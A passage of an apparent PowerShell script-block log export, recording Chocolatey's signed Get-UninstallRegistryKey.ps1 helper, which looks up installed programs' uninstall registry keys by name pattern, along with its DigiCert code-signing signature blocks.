bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPavSbp9dQ2siazYDp0Amg+EIr+hM9dp7a+0W # HNXStdkwDQYJKoZIhvcNAQEBBQAEggEASoaLXJSP8+kK99AO2/eLEtUgHMzrBxAl # 3VzBEO3yPsYgKkF2KgZc4+FheBMEUJmGnqnZXUzigSJFj2yuCX9drT9SLDxYlqLs # 7Ua4a7P+6qNOI+fv4RgzDpKhDIfLSyNtjfin2TUO6nnmCmKXBHHCGl6wT+3jXZZN # OrP0DRckft9wI+yARwZnsliyJJMJVyJ1HWiWQ1NBv1E8kxeHyiEvOKFWMU5Fxjcj # shLQenOBAQ0zgPgtO+1Mv7tVKPC/mPwz0XreiGzGdSz4BVdzNX8eqWTKAgBPj3Mq # bPOn+9cJalY+K0OXF0qjKx27oDqAJTgXt+XxHQVVUY1bwypkep6pZaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUnLpFbpv40cF+T1dB # 0ypaJ3jlTSowDQYJKoZIhvcNAQEBBQAEggEALrngzN2q5JHS+d5l8DxExXPtlQNA # JAKNBwqX67SWFfNfkxNZMFGuFchaQdB0k9VI0jWjfw79y4ZstY4f30i0ejf2v1MI # wjk6Hb02leUalNfkLJ15/LVbIj5GVbqc/ozZca6//w2OEt1UOBIEtM3ouv+WOnXk # yFTtR9F7HK8MLWRSnQf1BGYxHqcV9oUGVQUkIj81FVXz/O0ZH6fZ21ZFl17OJ/Yo # T4MurhlQWXSGtEaBioiyMD+EUOlEF41qxzxorydfgg3Y+UHLtOayryak/AVggpi/ # F8NPHe/rwVBbXO28fjwtMdy/eyXD9cV+07qiarT2sJI6LZWqo7ag34qtVw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-UninstallRegistryKey.ps1 ¦ ScriptBlockId: 57b0cbfd-95ae-42e1-845b-c8ba873823ad ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2011 - 2017 RealDimensions Software, LLC # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-UninstallRegistryKey { <# .SYNOPSIS Retrieve registry key(s) for system-installed applications from an exact or wildcard search. .DESCRIPTION This function will attempt to retrieve a matching registry key for an already installed application, usually to be used with a chocolateyUninstall.ps1 automation script. The function also prevents `Get-ItemProperty` from failing when handling wrongly encoded registry keys. .NOTES Available in 0.9.10+. If you need to maintain compatibility with pre 0.9.10, please add the following to your nuspec (check for minimum version): ~~~xml <dependencies> <dependency id=""chocolatey-core.extension"" version=""1.1.0"" /> </dependencies> ~~~ .INPUTS String .OUTPUTS This function searches registry objects and returns an array of PSCustomObject with the matched key's properties. Retrieve properties with dot notation, for example: `$key.UninstallString` .PARAMETER SoftwareName Part or all of the Display Name as you see it in Programs and Features. It should be enough to be unique. The syntax follows the rules of the PowerShell `-like` operator, so the `*` character is interpreted as a wildcard, which matches any (zero or more) characters. If the display name contains a version number, such as ""Launchy (2.5)"", it is recommended you use a fuzzy search `""Launchy (*)""` (the wildcard `*`) so if Launchy auto-updates or is updated outside of Chocolatey, the uninstall script will not fail. Take care not to abuse fuzzy/glob pattern searches. Be conscious of programs that may have shared or common root words to prevent overmatching. For example, ""SketchUp*"" would match two keys with software names ""SketchUp 2016"" and ""SketchUp Viewer"" that are different programs released by the same company. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Version match: Software name is ""Gpg4Win (2.3.0)"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Gpg4win (*)"" $key.UninstallString .EXAMPLE > # Fuzzy match: Software name is ""Launchy 2.5"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Launchy*"" $key.UninstallString .EXAMPLE > # Exact match: Software name in Programs and Features is ""VLC media player"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""VLC media player"" $key.UninstallString .EXAMPLE > # Version match: Software name is ""SketchUp 2016"" # Note that the similar software name ""SketchUp Viewer"" would not be matched. [array]$key = Get-UninstallRegistryKey -SoftwareName ""SketchUp [0-9]*"" $key.UninstallString .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Uninstall-ChocolateyPackage #> [CmdletBinding()] param( [parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)] [string] $softwareName, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($softwareName -eq $null -or $softwareName -eq '') { throw ""$SoftwareName cannot be empty for Get-UninstallRegistryKey"" } $ErrorActionPreference = 'Stop' $local_key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' Write-Verbose ""Retrieving all uninstall registry keys"" [array]$keys = Get-ChildItem -Path @($machine_key6432, $machine_key, $local_key) -ErrorAction SilentlyContinue Write-Debug ""Registry uninstall keys on system: $($keys.Count)"" Write-Debug ""Error handling check: `'Get-ItemProperty`' fails if a registry key is encoded incorrectly."" [int]$maxAttempts = $keys.Count for ([int]$attempt = 1; $attempt -le $maxAttempts; $attempt++) { [bool]$success = $false $keyPaths = $keys | Select-Object -ExpandProperty PSPath try { [array]$foundKey = Get-ItemProperty -Path $keyPaths -ErrorAction Stop | ? { $_.DisplayName -like $softwareName } $success = $true } catch { Write-Debug ""Found bad key."" foreach ($key in $keys){ try { Get-ItemProperty $key.PsPath > $null } catch { $badKey = $key.PsPath } } Write-Verbose ""Skipping bad key: $badKey"" [array]$keys = $keys | ? { $badKey -NotContains $_.PsPath } } if ($success) { break; } if ($attempt -ge 10) { Write-Warning ""Found 10 or more bad registry keys. Run command again with `'--verbose --debug`' for more info."" Write-Debug ""Each key searched should correspond to an installed program. It is very unlikely to have more than a few programs with incorrectly encoded keys, if any at all. This may be indicative of one or more corrupted registry branches."" } } if ($foundKey -eq $null -or $foundkey.Count -eq 0) { Write-Warning ""No registry key found based on '$softwareName'"" } Write-Debug ""Found $($foundKey.Count) uninstall registry key(s) with SoftwareName:`'$SoftwareName`'""; return $foundKey } Set-Alias Get-InstallRegistryKey Get-UninstallRegistryKey # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBES8sHzbRLLNcJ # 9iSdROLrD1zFWyfa5gBGwaNn1wzd16CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPavSbp9dQ2siazYDp0Amg+EIr+hM9dp7a+0W # HNXStdkwDQYJKoZIhvcNAQEBBQAEggEASoaLXJSP8+kK99AO2/eLEtUgHMzrBxAl # 3VzBEO3yPsYgKkF2KgZc4+FheBMEUJmGnqnZXUzigSJFj2yuCX9drT9SLDxYlqLs # 7Ua4a7P+6qNOI+fv4RgzDpKhDIfLSyNtjfin2TUO6nnmCmKXBHHCGl6wT+3jXZZN # OrP0DRckft9wI+yARwZnsliyJJMJVyJ1HWiWQ1NBv1E8kxeHyiEvOKFWMU5Fxjcj # shLQenOBAQ0zgPgtO+1Mv7tVKPC/mPwz0XreiGzGdSz4BVdzNX8eqWTKAgBPj3Mq # bPOn+9cJalY+K0OXF0qjKx27oDqAJTgXt+XxHQVVUY1bwypkep6pZaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUnLpFbpv40cF+T1dB # 0ypaJ3jlTSowDQYJKoZIhvcNAQEBBQAEggEALrngzN2q5JHS+d5l8DxExXPtlQNA # JAKNBwqX67SWFfNfkxNZMFGuFchaQdB0k9VI0jWjfw79y4ZstY4f30i0ejf2v1MI # wjk6Hb02leUalNfkLJ15/LVbIj5GVbqc/ozZca6//w2OEt1UOBIEtM3ouv+WOnXk # yFTtR9F7HK8MLWRSnQf1BGYxHqcV9oUGVQUkIj81FVXz/O0ZH6fZ21ZFl17OJ/Yo # T4MurhlQWXSGtEaBioiyMD+EUOlEF41qxzxorydfgg3Y+UHLtOayryak/AVggpi/ # F8NPHe/rwVBbXO28fjwtMdy/eyXD9cV+07qiarT2sJI6LZWqo7ag34qtVw== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
